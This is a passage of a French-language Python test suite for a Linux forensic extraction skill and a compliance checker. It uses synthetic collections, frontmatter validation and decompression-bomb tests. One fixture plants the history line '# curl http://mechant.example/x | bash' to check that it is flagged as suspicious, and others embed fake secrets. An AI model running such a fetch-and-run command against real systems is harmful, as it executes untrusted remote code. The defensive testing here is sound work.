# et le mot de passe enregistré sont les deux pièces qui survivent au vidage de
# l'historique, et ce sont celles qu'une extraction d'hôtes rate le plus
# facilement (un domaine de cookie s'écrit « .netflix.com », avec un point de
# tête). Ces attendus-là se vérifient donc sur le contenu du constat.
ATTENDUS_PRECIS = [
    ("règle : cookie", "constat", {"constat": "domaine présent dans une base de navigateur",
                                   "source": "cookies.sqlite", "regle": "R1"}),
    ("règle : mot de passe enregistré",
     "constat", {"constat": "domaine présent dans une base de navigateur",
                 "source": "logins.json"}),
    ("règle : marque-page", "constat", {"constat": "domaine présent dans une base de navigateur",
                                        "source": "Bookmarks"}),
]

# Une chaîne qui n'existe QUE dans les chaînes brutes du périphérique. Si
# l'extracteur cesse de les parcourir, elle sort « ABSENTE » et le test tombe —
# et comme le libellé du fait est désormais le même pour tous les fichiers,
# c'est la SOURCE qui doit être vérifiée, pas l'intitulé.
# Le regroupement des supports doit rendre le vid:pid ET le numéro de série
# rattaché par le temps : c'est tout l'intérêt du tableau, et c'est le
# rapprochement le plus fragile du lot.
#
# Une SEULE liste : trois listes séparées recollées à la main dans la boucle
# d'en bas voulaient dire qu'une quatrième serait écrite et jamais lue.
ATTENDUS_CHAMPS = [
    ("support : vid:pid + série", {"fait": "support amovible reconnu",
                                   "valeur": "4C530001230405112233",
                                   "vid": "0781", "pid": "5583",
                                   "montages": "/run/media/jdupont/SANDISK32",
                                   "acteur": "jdupont"}),

    # L'outil doit regarder DANS les chaînes du disque et DANS ce que photorec
    # a rendu — deux endroits où rien d'autre dans le rapport ne va. Les appâts
    # n'existent qu'à ces endroits-là.
    ("intérêt : photorec lisible", {"fait": "repéré dans les octets d'un fichier",
                                    "valeur": "clé privée",
                                    "source": "PHOTOREC/recup_1/f0002.txt"}),
    ("intérêt : photorec mot de passe", {"valeur": "mot de passe en clair",
                                         "source": "PHOTOREC/recup_1/f0007.txt"}),
    ("intérêt : chaînes du disque", {"valeur": "jeton AWS",
                                     "source": "_strings_racine.txt"}),
    ("intérêt : docx décompressé", {"valeur": "mot de passe en clair",
                                    "source": "PHOTOREC/recup_1/f0008.docx"}),
    # Le document doit être CARACTÉRISÉ, pas seulement fouillé : son sujet lu
    # dans le XML du .docx, et ce qu'il porte. « porte » ne dit QUE le contenu
    # (utilisateur, système) : les motifs sensibles sont des faits « intérêt »
    # sur la même source, et c'est là-dessus que le rapport recolle les deux.
    # Les chercher aussi ici, c'était un second moteur qui se contredisait.
    ("document : sujet du docx", {"fait": "fichier rendu sans nom, et lisible",
                                  "valeur": "Compte rendu",
                                  "source": "PHOTOREC/recup_1/f0008.docx",
                                  "porte": "utilisateur"}),
    ("document : remplissage écarté", {"fait": "fichier rendu sans nom, et lisible",
                                       "source": "f0007.txt"}),
    ("document : xfs_undelete", {"fait": "fichier rendu sans nom, et lisible",
                                 "source": "SUPPRIMES/racine/",
                                 "porte": "utilisateur"}),

    ("chaîne imbriquée dans un motif", {"fait": "texte recherché présent dans un fichier",
                                        "valeur": "Bienvenue2025!",
                                        "source": "PHOTOREC/recup_1/f0007.txt"}),
    ("indicateur dans les chaînes", {"fait": "texte recherché présent dans un fichier",
                                     "valeur": "chaine-effacee-que-rien-d-autre-ne-porte",
                                     "source": "STRINGS/"}),
    ("indicateur dans un .gz du tar", {"fait": "texte recherché présent dans un fichier",
                                       "valeur": "journal-tourne-et-comprime-dans-le-tar",
                                       "source": "_var_log.tar.gz → var/log/auth.log.2.gz"}),

    # Un seul moteur de motifs : le fait « document » ne porte plus de champ
    # « interet ». S'il en reparaissait un, c'est qu'une seconde recherche a
    # été rajoutée dans documents(), et les deux se contrediraient.
    ("un seul moteur de motifs", {"__absent__": "interet"}),

    # ── la synthèse des adresses ──────────────────────────────────────
    # Ce qui compte n'est pas de trouver l'adresse, c'est de dire D'OÙ elle
    # sort. La même IP vue dans un profil réseau ET dans les octets du disque
    # doit porter les deux provenances sur une SEULE ligne.
    ("adresse : deux provenances", {"fait": "adresse IP vue dans la collecte",
                                    "valeur": "10.0.0.9",
                                    "ou": "chaînes du disque / configuration réseau",
                                    "portee": "privée"}),
    # Vue seulement dans les octets bruts : jamais mieux qu'« à vérifier »,
    # quelle que soit la catégorie du fait qui la porte. C'est le DOSSIER qui
    # décide de la provenance, pas l'intitulé.
    ("adresse : sans provenance", {"valeur": "192.168.0.5", "genre": "IP",
                                   "confiance": "à vérifier",
                                   "ou": "chaînes du disque"}),
    # Le bit « administré localement » : une MAC tirée au hasard ne suit pas une
    # machine d'un réseau à l'autre. Le rapport doit le dire, sinon on croit
    # identifier un matériel alors qu'on suit un tirage.
    ("adresse : MAC tirée au hasard", {"valeur": "b2:7a:11:c0:ff:ee",
                                       "portee": "administrée localement"}),
    ("adresse : MAC constructeur", {"valeur": "dc:a6:32:1b:4e:07",
                                    "portee": "constructeur DC:A6:32"}),
    # Une MAC écrite dans les octets du disque et nulle part ailleurs : la seule
    # pièce qui garde la trace d'un point d'accès ou d'une machine du réseau
    # local dont plus aucune configuration ne parle.
    ("adresse : MAC des octets bruts", {"valeur": "e8:9c:25:3f:0a:b1",
                                        "genre": "MAC", "confiance": "à vérifier"}),
    # Les URL sont regroupées par HÔTE, sinon ce n'est plus une synthèse. Il
    # n'existe qu'UN fait « adresse » par (genre, valeur) : deux attentes qui
    # trouvent chacune une provenance différente pour le même hôte prouvent
    # donc qu'elles ont été recollées sur une seule ligne. Les nommer une par
    # une, plutôt que d'exiger la chaîne jointe entière, évite qu'un simple
    # changement d'ordre fasse tomber un test qui ne porte pas là-dessus.
    ("adresse : URL groupée par hôte", {"valeur": "www.yggtorrent.wtf",
                                        "genre": "URL", "ou": "navigation"}),
    ("adresse : le même hôte, du disque", {"valeur": "www.yggtorrent.wtf",
                                           "genre": "URL",
                                           "ou": "chaînes du disque"}),

    # 203.0.113.42 est l'indicateur que le piège dit « jamais vue ici ». Son
    # fait d'ABSENCE porte la valeur cherchée : lue comme une adresse, elle
    # rangeait parmi les adresses VUES sur le poste celle que l'analyste avait
    # justement cherchée SANS la trouver. Le pire contresens possible ici.
    ("adresse : une absence n'est pas une adresse",
     {"__jamais__": {"categorie": "adresse", "valeur": "203.0.113.42"}}),
    # Le contexte d'un motif est coupé à soixante octets sans égard pour ce
    # qu'il tranche : « …/999 https://www.yggtor » y rend un hôte qui n'a
    # jamais existé. Inventer une adresse est plus grave que d'en manquer une.
    ("adresse : pas d'hôte tronqué",
     {"__jamais__": {"categorie": "adresse", "valeur": "www.yggtor"}}),

    # La polarité doit être DITE, des deux côtés. Un fait « indicateur » qui
    # n'a pas de « trouve » est un fait dont seule la phrase française dit
    # s'il rapporte une présence ou une absence — et c'est ainsi que la valeur
    # d'une absence se glisse là où on lit des trouvailles.
    ("indicateur : la polarité est dite",
     {"__jamais__": {"categorie": "indicateur", "trouve": None}}),

    # ── les dates d'une ligne syslog ──────────────────────────────────
    # Une ligne syslog ne porte NI année NI fuseau : c'est l'heure lue sur
    # l'horloge du poste. L'horodatage doit donc sortir NU — le marquer « Z »
    # revenait à affirmer de l'UTC, et mettait deux échelles dans le même
    # fichier de faits, à côté de faits journalctl correctement décalés.
    ("syslog : l'heure du poste", {"fait": "connexion SSH acceptée",
                                   "horodatage": "2026-01-05T09:00:01",
                                   "acteur": "mrobert"}),
    # En EXACT, et c'est indispensable : « 09:00:01 » est une sous-chaîne de
    # « 09:00:01Z », donc l'attente ci-dessus passait aussi sur le code fautif.
    ("syslog : jamais marqué Z",
     {"__jamais__": {"fait": "connexion SSH acceptée",
                     "horodatage": "2026-01-05T09:00:01Z"}}),
    # Et l'année ne doit pas reculer d'un cran parce que l'heure locale
    # dépasse le mtime UTC du fichier.
    ("syslog : l'année ne recule pas", {"fait": "connexion SSH acceptée",
                                        "horodatage": "2026-01-08T13:30:00",
                                        "acteur": "jdupont"}),

    # ── l'historique de navigation n'est pas borné ────────────────────
    # Le piège pose 22 pages dans places.sqlite — dont 20 anciennes — et 1 dans
    # Chrome. Les 23 doivent devenir des faits : une borne garde « les plus
    # récentes d'abord » et laisse dehors les anciennes, qui sont justement
    # celles qu'aucune autre pièce ne porte quand l'historique récent a été
    # vidé. Compter est la SEULE forme qui attrape ça — une recherche par
    # présence trouve toujours les premières lignes et ne voit rien.
    ("navigation : rien n'est borné", {"__compte__": ("page visitée", 23)}),
    ("navigation : la plus ancienne est là", {"fait": "page visitée",
                                              "valeur": "vieux-site-003.example"}),
    # Et si quelqu'un rebornait la lecture selon l'idiome de la maison, il
    # poserait l'un de ces deux faits pour le dire. Qu'ils n'existent jamais
    # est la garde qui tient même sur un piège plus petit que la borne.
    ("navigation : aucun fait de borne",
     {"__jamais__": {"categorie": "limite", "fait": "historique de navigation tronqué"}}),
    ("navigation : aucune borne de lecture",
     {"__jamais__": {"categorie": "limite",
                     "fait": "marque-pages : la borne de lecture est atteinte"}}),
]


# Ce que Crush REFUSE, repris de Skill.Validate (internal/skills/skills.go).
# Tout est compté en OCTETS : ce sont des len() sur des chaînes Go, et en
# français chaque accent en pèse deux. Un skill que Crush refuse disparaît de
# l'agent avec une simple pastille rouge — d'où l'intérêt de le voir ici.
NOM_MAX, DESCRIPTION_MAX, COMPATIBILITE_MAX = 64, 1024, 500
RE_NOM_SKILL = re.compile(r'^[a-zA-Z0-9]+(-[a-zA-Z0-9]+)*$')

# Le corps, lui, n'est PAS borné par Crush : c'est une convention du projet,
# tirée de la spécification Agent Skills. Elle compte quand même, parce que le
# corps entier entre dans le contexte du modèle à chaque activation.
CORPS_MAX_JETONS = 5000
CORPS_MAX_LIGNES = 500


def frontmatter_sain(racine):
    """Le frontmatter d'un SKILL.md doit survivre à un vrai analyseur YAML.

    Crush le passe à gopkg.in/yaml.v3 : un « : » suivi d'une espace dans un
    scalaire NON QUOTÉ ouvre une association, et le fichier est rejeté avec
    « mapping values are not allowed in this context ». Le skill disparaît
    alors de l'agent, et l'interface se contente d'une pastille rouge — c'est
    exactement comme ça qu'une description bien écrite peut tout casser.
    Vérifier « la clé existe » avec une expression rationnelle ne voit rien de
    tout ça : il faut regarder ce qui rend le scalaire invalide.
    """
    ennuis = []
    for nom in sorted(os.listdir(racine)):
        chemin = os.path.join(racine, nom, "SKILL.md")
        if not os.path.isfile(chemin):
            continue
        texte = open(chemin, encoding="utf-8").read()
        if not texte.startswith("---\n") or "\n---" not in texte[4:]:
            ennuis.append((chemin, "frontmatter absent ou non refermé"))
            continue
        # Le CORPS est lu à chaque activation du skill, en entier, et il est
        # pris sur le contexte du modèle. La borne est celle de la spécification
        # Agent Skills, et le README annonce qu'elle est vérifiée ICI : sans ce
        # contrôle, elle se franchit d'un paragraphe à la fois sans que rien ne
        # le dise. Ce qui déborde va dans references/, lu à la demande.
        # En OCTETS, comme Crush : son ApproxTokenCount fait (len(s)+3)/4 sur
        # une chaîne Go, où len() compte les octets. En français, chaque accent
        # en pèse deux — compter les caractères sous-estime d'un bon 3 %, et
        # c'est ainsi qu'un corps déjà au-dessus de la borne passait pour bon.
        corps = texte[4:].split("\n---", 1)[1].strip()
        jetons = (len(corps.encode("utf-8")) + 3) // 4
        if jetons > CORPS_MAX_JETONS:
            ennuis.append((chemin, f"corps de ~{jetons} jetons : au-dessus des "
                                   f"{CORPS_MAX_JETONS} de la spécification. "
                                   f"Déplacez un passage dans references/"))
        if corps.count("\n") > CORPS_MAX_LIGNES:
            ennuis.append((chemin, f"corps de {corps.count(chr(10))} lignes : "
                                   f"au-dessus des {CORPS_MAX_LIGNES}"))
        # Les quatre refus de Crush. Les vérifier ICI et pas seulement « le
        # frontmatter s'analyse » : un scalaire valide mais trop long, ou un
        # nom qui ne colle pas au dossier, passait pour bon et faisait
        # disparaître le skill.
        entete = {}
        for ligne in texte[4:].split("\n---", 1)[0].splitlines():
            cle, _, valeur = ligne.partition(":")
            if valeur and cle == cle.strip() and cle.strip():
                entete[cle.strip()] = valeur.strip().strip("\"'")
        if not entete.get("description"):
            ennuis.append((chemin, "« description » absente — Crush refuse le skill"))
        for cle, borne in (("name", NOM_MAX), ("description", DESCRIPTION_MAX),
                           ("compatibility", COMPATIBILITE_MAX)):
            taille = len(entete.get(cle, "").encode("utf-8"))
            if taille > borne:
                ennuis.append((chemin, f"« {cle} » fait {taille} octets, Crush "
                                       f"refuse au-delà de {borne}"))
        if not RE_NOM_SKILL.match(entete.get("name", "")):
            ennuis.append((chemin, f"« name » = {entete.get('name')!r} : Crush "
                                   "attend des lettres, des chiffres et des "
                                   "traits d'union simples"))
        elif entete["name"].lower() != nom.lower():
            ennuis.append((chemin, f"« name » = {entete['name']!r} mais le "
                                   f"dossier est {nom!r} — Crush exige l'égalité"))

        for ligne in texte[4:].split("\n---", 1)[0].splitlines():
            if not ligne.strip() or ligne.lstrip().startswith("#"):
                continue
            if ":" not in ligne:
                continue
            cle, _, valeur = ligne.partition(":")
            if not cle.strip() or cle != cle.strip():
                continue
            valeur = valeur.strip()
            if not valeur or valeur[0] in "\"'|>[{&*!":     # quoté ou structuré
                continue
            if ": " in valeur or valeur.endswith(":"):
                ennuis.append((chemin, f"« {cle} » : « : » dans un scalaire non "
                                       f"quoté — mettez la valeur entre guillemets"))
            elif " #" in valeur:
                ennuis.append((chemin, f"« {cle} » : « #» ouvre un commentaire "
                                       f"dans un scalaire non quoté"))
    return ennuis


def lire(chemin, cle):
    with open(chemin, encoding="utf-8") as fh:
        return {json.loads(l)[cle] for l in fh if l.strip()}



# ── l'échafaudage des blocs de contrôle ───────────────────────────────
# Trois fabriques, une seule fois chacune : elles étaient recopiées de quatre à
# six fois, et les deux versions de « tourner » avaient déjà divergé — l'une
# tolérait la sortie absente, l'autre levait FileNotFoundError et faisait
# passer un contrôle rouge pour un plantage de toute la suite.
EXTRAIRE = os.path.join(SKILLS, "forensic-linux", "scripts", "extraire.py")
CONTROLES = os.path.join(SKILLS, "conformite-linux", "scripts", "controles.py")


def coin_collecte(coin, nom, *dossiers):
    """Une collecte vide, sous <coin>/<nom>/PC42_B12_ARTE_ubuntu/."""
    r = os.path.join(coin, nom, "PC42_B12_ARTE_ubuntu")
    for d in dossiers:
        os.makedirs(os.path.join(r, d), exist_ok=True)
    return r


def poser_tar_gz(chemin, membres):
    """membres : [(nom, octets)] — l'archive telle que la collecte l'écrit."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        for nom, contenu in membres:
            ti = tarfile.TarInfo(nom)
            ti.size = len(contenu)
            t.addfile(ti, io.BytesIO(contenu))
    with open(chemin, "wb") as fh:
        fh.write(gzip.compress(buf.getvalue()))


def tourner(script, racine, sortie, *reste, env=None):
    """(code de retour, faits lus). Une sortie absente rend une liste vide, et
    non une exception : c'est au contrôle de juger, pas à la suite de tomber.

    « env » sert à rejouer la MÊME extraction ailleurs — sous un autre fuseau,
    par exemple —, sans réécrire l'appel et la relecture du JSONL.
    """
    p = subprocess.run([sys.executable, script, racine, "-o", sortie, *reste],
                       stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, env=env)
    lus = []
    if os.path.exists(sortie):
        with open(sortie, encoding="utf-8") as fh:
            lus = [json.loads(l) for l in fh if l.strip()]
    return p.returncode, lus


def blocs_bornes():
    """Un .gz rend des blocs BORNÉS, et le plafond d'archive joue sur lui.

    Un journal tourné se comprime d'un facteur trois cents : rendu d'un seul
    tenant, un bloc d'entrée d'un mégaoctet en faisait deux cents en mémoire,
    que le chercheur recopiait puis balayait une fois par motif — l'extraction
    paraissait bloquée. Et le plafond, la garde contre les bombes de
    décompression, ne couvrait pas la forme comprimée la PLUS courante.

    Le piège synthétique est trop petit pour montrer ça : ce contrôle-ci
    fabrique donc ses propres octets, et il vérifie les trois propriétés qui
    doivent tenir ensemble — bornées, complètes, et l'empreinte du fichier
    entier malgré la troncature.
    """
    import gzip, hashlib, io
    sys.path.insert(0, os.path.join(SKILLS, "forensic-linux", "scripts"))

    ligne = b"Jan  8 14:02:11 pc01 systemd[1]: Started Session 4231 of jdupont.\n"
    clair = ligne * (24 * 1024 * 1024 // len(ligne))
    comp = gzip.compress(clair, 6)
    etat, rendu, gros = {}, 0, 0
    for _, c in extraire._blocs("syslog.2.gz", lambda: io.BytesIO(comp), etat):
        rendu += len(c)
        gros = max(gros, len(c))
    yield ("gz : blocs bornés", gros <= (1 << 20),
           f"plus gros bloc clair {gros / 1048576:.2f} Mo (max 1,00)")
    yield ("gz : rien n'est perdu", rendu == len(clair),
           f"{rendu} octets rendus sur {len(clair)}")

    # Au-delà du plafond : on s'arrête, on le DIT, et l'empreinte reste celle
    # du fichier entier — sans quoi une empreinte recherchée ne correspondrait
    # plus à rien, en silence.
    bombe = gzip.compress(b"A" * (extraire.PLAFOND_ARCHIVE + (8 << 20)), 6)
    etat, h, rendu = {}, hashlib.sha256(), 0
    for b, c in extraire._blocs("bombe.gz", lambda: io.BytesIO(bombe), etat):
        h.update(b)
        rendu += len(c)
    yield ("gz : le plafond joue", "tronque" in etat and rendu <= extraire.PLAFOND_ARCHIVE + (1 << 20),
           f"{rendu / 1048576:.0f} Mo rendus, etat={etat.get('tronque') or 'AUCUN'}")
    yield ("gz : empreinte complète", h.hexdigest() == hashlib.sha256(comp := bombe).hexdigest(),
           "sha256 du fichier entier malgré la troncature")

    # Le plafond vaut pour les CINQ compresseurs, pas pour le seul .gz. Un .xz
    # comprime bien mieux qu'un gzip : c'est la bombe la plus efficace des
    # quatre, et c'était justement celle qui passait par lzma.decompress d'un
    # bloc, sans aucune borne.
    import lzma as _lz
    plafond = extraire.PLAFOND_ARCHIVE
    try:
        extraire.PLAFOND_ARCHIVE = 1 << 20
        avant = len(extraire.FAITS)
        for suffixe, comprimer in ((".xz", _lz.compress), (".bz2", bz2.compress),
                                   (".gz", gzip.compress)):
            rendu = extraire.decomprimer("syslog.1" + suffixe,
                                         comprimer(b"\0" * (64 << 20)))
            yield (f"bombe {suffixe} : bornée",
                   rendu is not None and len(rendu) <= (1 << 20),
                   f"{len(rendu or b'') / 1048576:.2f} Mio rendus (plafond 1,00)")
        dits = [x for x in extraire.FAITS[avant:] if x["categorie"] == "limite"]
        yield ("bombes : la coupe se dit", len(dits) == 3,
               f"{len(dits)} fait(s) « limite » pour trois bombes")
        del extraire.FAITS[avant:]
    finally:
        extraire.PLAFOND_ARCHIVE = plafond

    # Un .gz dont le corps est abîmé APRÈS un secret : le contenu sain qui
    # précède doit sortir, et UNE seule fois. zlib lève pour tout l'appel, si
    # bien qu'un mégaoctet d'entrée d'un coup faisait perdre tout le sain ;
    # puis le rattrapage relisait le fichier depuis le début et comptait deux
    # fois ce qui précédait la corruption. Mesuré : 2 occurrences pour une.
    secret = b"\npassword=SuperMotDePasse2024\n"
    brut = os.urandom(200_000) + secret + os.urandom(2_000_000)
    gz = bytearray(gzip.compress(brut))
    gz[len(gz) - 300_000] ^= 0xFF
    etat, morceaux = {}, []
    for _, clair in extraire._blocs("s.gz", lambda: io.BytesIO(bytes(gz)), etat):
        morceaux.append(clair)
    tout = b"".join(morceaux)
    yield ("gz abîmé : le préfixe sain sort UNE fois",
           tout.count(secret) == 1 and "illisible" in etat,
           f"{tout.count(secret)} occurrence(s) du secret, "
           f"{len(tout) / 1048576:.1f} Mio sauvés sur 2,1")


def pieces_abimees(base):
    """Une pièce abîmée ne doit jamais disparaître SANS LE DIRE.

    Six pertes silencieuses de preuve, toutes mesurées sur du code réel avant
    correction. Le fil commun : le rapport ne portait aucune trace du trou, et
    une phase à zéro fait se lit comme « rien à signaler ». Deux d'entre elles
    faisaient pire que se taire — un fichier présent déclaré absent, et une
    règle enfreinte déclarée conforme.
    """
    import lzma

    coin = os.path.join(base, "abimees")
    MOT = b"MOT-CLE-AFFAIRE-2024"
    collecte = functools.partial(coin_collecte, coin)
    tar_gz = poser_tar_gz

    # ── 1 · un .gz au corps abîmé : l'EMPREINTE ne dépend pourtant de rien ──
    # Elle sortait « ABSENTE » pour un fichier bel et bien dans la collecte :
    # l'exception coupait examiner() avant le calcul des empreintes, et
    # lire_source l'avalait sans rien noter.
    r = collecte("gz-abime", "STRINGS")
    octets = bytearray(gzip.compress(MOT + b" present\n" * 200))
    octets[14] ^= 0xFF                       # en-tête valide, corps cassé
    with open(os.path.join(r, "STRINGS", "PC42_B12_ARTE_ubuntu_strings_sda1.txt.gz"),
              "wb") as fh:
        fh.write(bytes(octets))
    ind = os.path.join(coin, "ind.txt")
    with open(ind, "w", encoding="utf-8") as fh:
        fh.write("sha256: " + hashlib.sha256(bytes(octets)).hexdigest() + "\n")
    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "gz-abime.jsonl"),
                       "--indicateurs", ind)
    libelles = {f["fait"] for f in faits}
    yield ("gz abîmé : l'empreinte sort quand même",
           "fichier à l'empreinte sha256 recherchée" in libelles,
           "une empreinte ne demande aucune décompression")
    yield ("gz abîmé : le trou est dit",
           any(f["categorie"] == "limite" and "non lisible" in f["fait"] for f in faits),
           "un fait « limite » nomme la pièce")

    # ── 2 · un .gz MULTI-MEMBRE (cat a.gz b.gz, gzip -c f1 f2) ──
    # decompressobj s'arrête au premier membre ; gzip.decompress les lit tous.
    r = collecte("gz-multi", "STRINGS")
    with open(os.path.join(r, "STRINGS", "PC42_B12_ARTE_ubuntu_strings_sda1.txt.gz"),
              "wb") as fh:
        fh.write(gzip.compress(b"rien ici\n" * 40)
                 + gzip.compress(MOT + b" dans le SECOND membre\n"))
    textes = os.path.join(coin, "textes.txt")
    with open(textes, "w", encoding="utf-8") as fh:
        fh.write(MOT.decode() + "\n")
    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "gz-multi.jsonl"),
                       "--textes", textes)
    yield ("gz multi-membre : le second est lu",
           any(f["fait"] == "texte recherché présent dans un fichier" for f in faits),
           "le mot-clé n'est QUE dans le second membre")

    # ── 3 · un nom de fichier qui n'est pas de l'UTF-8 ──
    # os.walk rend les octets indécodables en demi-codets ; json.dumps les
    # laisse passer et c'est l'ÉCRITURE qui levait, à la toute dernière ligne
    # du programme : traceback, faits.jsonl tronqué, ni CSV ni manifeste.
    r = collecte("nom-latin1", "PHOTOREC/recup_1")
    with open(os.path.join(r, "PHOTOREC", "recup_1",
                           os.fsdecode(b"f0001_\xe9t\xe9.txt")), "wb") as fh:
        fh.write(b"contact: jdupont@example.com\n" * 4)
    sortie = os.path.join(coin, "nom-latin1.jsonl")
    code, faits = tourner(EXTRAIRE, r, sortie, "--textes", textes)
    complet = code == 0 and all(os.path.exists(os.path.splitext(sortie)[0] + s)
                                for s in (".csv", "-manifeste.json"))
    yield ("nom non-UTF-8 : la sortie est écrite", complet,
           f"code {code}, CSV et manifeste présents" if complet
           else f"code {code} — sortie incomplète")
    yield ("nom non-UTF-8 : l'octet est lisible",
           any("\\xe9" in str(f.get("source", "")) for f in faits),
           "l'octet indécodable est rendu sous sa forme \\xNN")

    # ── 4 · un membre .gz abîmé DANS un tar n'emporte plus la phase ──
    # zlib.error n'hérite d'aucune des exceptions rattrapées : elle remontait
    # jusqu'à etape(), qui arrêtait « journaux » en entier — les membres
    # SUIVANTS n'étaient jamais lus.
    ssh = (b"Jan  5 09:00:01 pc42 sshd[1010]: Accepted password for mrobert "
           b"from 10.1.2.3 port 55000 ssh2\n")
    # Un corps deflate assez long pour que l'octet retourné tombe dans les
    # données et non dans la somme de contrôle : c'est zlib.error qu'il faut
    # ici, pas le BadGzipFile d'un CRC faux, qui lui était déjà rattrapé.
    casse = bytearray(gzip.compress(b"Jan  4 08:00:00 pc42 sshd[9]: "
                                    b"Accepted password for jdupont\n" * 200))
    casse[20] ^= 0xFF
    r = collecte("tar-membre-abime", "JOURNAUX")
    tar_gz(os.path.join(r, "JOURNAUX", "PC42_B12_ARTE_ubuntu_var_log.tar.gz"),
           [("var/log/auth.log.1.gz", bytes(casse)), ("var/log/secure", ssh)])
    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "tar-membre.jsonl"))
    yield ("membre abîmé : le membre SUIVANT est lu",
           any("mrobert" == f.get("acteur") for f in faits),
           "la connexion SSH est APRÈS le membre abîmé dans l'archive")

    # ── 5 · une archive tar tronquée laisse une trace dans les FAITS ──
    # Elle n'en laissait que sur stderr — or le rapport est bâti sur les faits.
    r = collecte("tar-tronque", "JOURNAUX")
    p = os.path.join(r, "JOURNAUX", "PC42_B12_ARTE_ubuntu_var_log.tar.gz")
    tar_gz(p, [("var/log/auth.log", ssh), ("var/log/secure", ssh),
               ("var/log/messages", ssh)])
    with open(p, "rb") as fh:
        entier = fh.read()
    with open(p, "wb") as fh:
        fh.write(entier[:len(entier) // 2])
    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "tar-tronque.jsonl"))
    yield ("tar tronqué : un fait le dit",
           any(f["categorie"] == "limite" and "var_log.tar.gz" in str(f.get("source", ""))
               for f in faits),
           "« journaux 0 faits » se lit sinon comme « rien à signaler »")

    # ── 6 · conformité : .xz et .bz2 lus, .zst dit ──
    # texte_de ne connaissait que .gz et se taisait sur tout le reste : une
    # règle réellement ENFREINTE était rendue « conforme », la preuve étant
    # dans un .xz. Le skill forensic, lui, lisait les cinq compresseurs.
    r = collecte("compresseurs", "PAQUETS")
    tar_gz(os.path.join(r, "PAQUETS", "PC42_B12_ARTE_ubuntu_historique.tar.gz"), [
        ("history.log.2.xz", lzma.compress(b"Commandline: apt install torbrowser-launcher\n")),
        ("history.log.3.bz2", bz2.compress(b"Commandline: apt install teamviewer\n")),
        ("history.log.4.zst", b"\x28\xb5\x2f\xfd" + b"\x00" * 40),
    ])
    regles = os.path.join(coin, "r.regles")
    with open(regles, "w", encoding="utf-8") as fh:
        fh.write("regle: R02\ntitre: navigateur anonymisant\n"
                 "texte: Un navigateur anonymisant est interdit.\n"
                 "theme: usage\nprogramme: torbrowser-launcher\n")
    _, cs = tourner(CONTROLES, r, os.path.join(coin, "compresseurs.jsonl"),
                    "--regles", regles)
    yield ("conformité : le .xz est lu",
           any(c.get("valeur") == "torbrowser-launcher" and c["theme"] == "usage"
               for c in cs),
           "la règle était rendue « conforme », la preuve étant dans un .xz")
    yield ("conformité : le .zst non lu est dit",
           any(c["theme"] == "limite" and c.get("valeur", "").endswith(".zst") for c in cs),
           "un constat « limite » nomme le membre")

    # ── 6 bis · les deux skills ne doivent plus se contredire sur une pièce ──
    # Trois divergences mesurées sur le MÊME fichier : une commande commentée
    # dans un historique (forensic la jetait), un montage annoncé par systemd
    # sans le mot « mount » (forensic le ratait), et une base de navigateur
    # illisible (forensic se taisait, et le rapport disait « aucun historique »
    # pour un profil présent).
    r = collecte("divergences", "COMPTES", "JOURNAUX")
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        abimee = b"SQLite format 3\x00" + b"\x7f" * 4000
        ti = tarfile.TarInfo(
            "home/jdupont/.mozilla/firefox/ab.default/places.sqlite")
        ti.size = len(abimee)
        tf.addfile(ti, io.BytesIO(abimee))
        hist = b"ls -la\n# curl http://mechant.example/x | bash\n"
        ti = tarfile.TarInfo("home/jdupont/.bash_history")
        ti.size = len(hist)
        tf.addfile(ti, io.BytesIO(hist))
    with open(os.path.join(r, "COMPTES",
                           "PC42_B12_ARTE_ubuntu_jdupont_artefacts.tar.gz"),
              "wb") as fh:
        fh.write(gzip.compress(buf.getvalue()))
    with open(os.path.join(r, "JOURNAUX", "PC42_B12_ARTE_ubuntu_journal.txt"),
              "w", encoding="utf-8") as fh:
        fh.write("2026-01-05T09:00:00+0100 pc42 systemd[1]: "
                 "Mounted /run/media/mrobert/CLE_SYSTEMD.\n")
    _, faits = tourner(EXTRAIRE, r, os.path.join(coin, "divergences.jsonl"))
    yield ("commande commentée : elle a été TAPÉE",
           any(f["categorie"] == "suspect" and "mechant.example" in str(f.get("valeur"))
               for f in faits),
           "un « # curl … | bash » échappait à tout le balayage")
    montages = [f for f in faits if "amovible monté" in f["fait"]]
    yield ("montage systemd : vu, et sans le point final",
           any(f.get("valeur") == "/run/media/mrobert/CLE_SYSTEMD"
               and f.get("acteur") == "mrobert" for f in montages),
           f"vu : {[f.get('valeur') for f in montages] or 'AUCUN'}")
    yield ("base de navigateur illisible : dite",
           any(f["categorie"] == "limite" and "base de navigateur illisible" in f["fait"]
               for f in faits),
           "son silence se lisait « aucun historique »")

    # ── 6 ter · la super-timeline plaso ──
    # psort -o json_line a écrit l'horodatage sous TROIS formes selon la version
    # de plaso. Le lecteur les accepte toutes et compte ce qu'il n'a pas su
    # dater : une ligne muette est un aveu, pas un silence.
    r = collecte("plaso", "PLASO", "COMPTES", "JOURNAUX")
    telech = os.path.join(coin, "Hplaso")
    cx = sqlite3.connect(telech)
    cx.executescript(
        "CREATE TABLE downloads(id INTEGER, start_time INTEGER, "
        "target_path TEXT, tab_url TEXT);"
        "INSERT INTO downloads VALUES(1, 13350000000000000, "
        "'/home/jdupont/Documents/facture.pdf', 'https://f.example/f');")
    cx.commit()
    cx.close()
    with open(telech, "rb") as fh:
        blob_p = fh.read()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        ti = tarfile.TarInfo(
            "home/jdupont/.config/google-chrome/Default/History")
        ti.size = len(blob_p)
        tf.addfile(ti, io.BytesIO(blob_p))
    with open(os.path.join(r, "COMPTES",
                           "PC42_B12_ARTE_ubuntu_jdupont_profils.tar.gz"),
              "wb") as fh:
        fh.write(gzip.compress(buf.getvalue()))
    with open(os.path.join(r, "JOURNAUX", "PC42_B12_ARTE_ubuntu_journal.txt"),
              "w", encoding="utf-8") as fh:
        fh.write("2026-01-05T09:00:00+0100 pc42 systemd[1]: "
                 "Mounted /run/media/jdupont/CLE_USB\n")
    t0 = epoch("2026-01-05T08:00:00")          # l'instant que les contrôles citent
    evts = [
        # forme 1 : « timestamp » en microsecondes
        {"data_type": "fs:stat", "parser": "filestat", "timestamp": t0 * US,
